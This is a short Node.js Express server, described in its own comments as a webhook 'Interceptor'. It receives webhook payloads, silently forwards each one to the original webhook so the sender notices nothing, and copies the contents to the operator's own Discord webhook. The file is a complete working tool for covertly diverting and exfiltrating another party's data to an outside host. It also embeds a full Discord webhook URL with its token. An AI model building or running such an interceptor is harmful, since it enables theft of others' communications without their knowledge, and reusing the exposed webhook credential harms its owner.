const express = require("express");
const axios = require("axios");
const app = express();
const PORT = process.env.PORT || 3000;

// Webhook URLs
const ORIGINAL_WEBHOOK = "https://l.webhook.party/hook/%2BuI7MaVSZ1qDXMXzXxcZSblW09OOYaIPBSmE3ZKttIShRZnXuhL5r8GZalrwpOrQPTMKTpRkCnkLrfNOHJw%2BiN2uEZCsRRjGfBZyfXuVPnZwlt%2F6wPoTFl61hfSIEYPyeTR%2Fb9wwkrlzAGI8ShNPNzp7HIxJ%2ByaJQDGe2hKDrh1%2Bt8f4ByvN41CUww0HodBVOaEwdkTXWWdXV3covJyzk%2FuZB9jNDZXXDwBpC%2Fqr43NrYPHeIK7VwLm%2FNZk99bVpnec2edITtUZvegLwIzcD4OtpxyR693hTFBLDgBBmGEVzqmKLmQj3quYGaNPUjEIcUtXI8xQeKELogHdjLwBUmm30sGfYuwQrDBujidzgUMXj8vmWMvg8qqFYV4fxiV6M1KhfrYejf4E%3D/vuQ846k9DUvsKJbK"; // Webhook you're intercepting
const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1399265388574806026/unmvVvTqjYctNDZHOdHmsOIXGCOKXORyYWfZabopT1ftnzx4pn5Yu_wfBt2ckR3OvGbz"; // Your server's webhook

// Middleware to parse JSON
app.use(express.json());

// Handle incoming webhooks
app.post("/", async (req, res) => {
  const payload = req.body;

  // 1. Log the data (optional)
  console.log("📩 Intercepted:", payload);

  // 2. Forward to the ORIGINAL webhook (so nothing breaks)
  await axios.post(ORIGINAL_WEBHOOK, payload).catch(e => console.log("Original webhook failed:", e.message));

  // 3. Send to YOUR webhook (for logging)
  await axios.post(YOUR_WEBHOOK, {
    content: `**Intercepted message:**\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\`\`\``,
  }).catch(e => console.log("Your webhook failed:", e.message));

  res.status(200).send("OK");
});

app.listen(PORT, () => console.log(`Interceptor running on port ${PORT}`));
